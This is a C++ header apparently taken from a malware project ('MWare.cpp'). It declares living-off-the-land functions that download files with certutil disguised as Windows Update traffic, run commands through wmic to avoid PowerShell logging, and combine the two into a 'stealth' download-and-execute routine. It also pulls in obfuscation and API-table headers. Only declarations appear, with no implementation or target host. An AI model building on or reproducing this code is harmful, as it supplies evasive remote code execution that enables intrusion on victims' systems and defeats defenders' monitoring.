// ============================================================================
// lolbas.h — LOLBAS (Living Off The Land Binaries And Scripts) Module
// ============================================================================
// Extracted from MWare.cpp lines 3747-3809.
// Provides stealth execution using Windows native binaries:
//   - Certutil.exe: HTTPS download camouflaged as Windows Update traffic
//   - Wmic.exe: Execute via WMI service (RPC over DCOM, no PowerShell logs)
//   - Combined: downloadViaCertutil + executeViaWmic
// ============================================================================
#pragma once

#include <string>
#include <fstream>

#include "api_table.h"
#include "obfuscation.h"

#ifdef _WIN32

// Certutil.exe download — traffic appears as Windows Certificate update
bool downloadViaCertutil(const std::string& url, const std::string& local_path);

// Wmic.exe execution — via WMI service, no PowerShell logs
bool executeViaWmic(const std::string& command);

// Hybrid: Certutil download + Wmic execute (most stealth combination)
bool stealthDownloadAndExecute(const std::string& url, const std::string& temp_path);

#endif // _WIN32
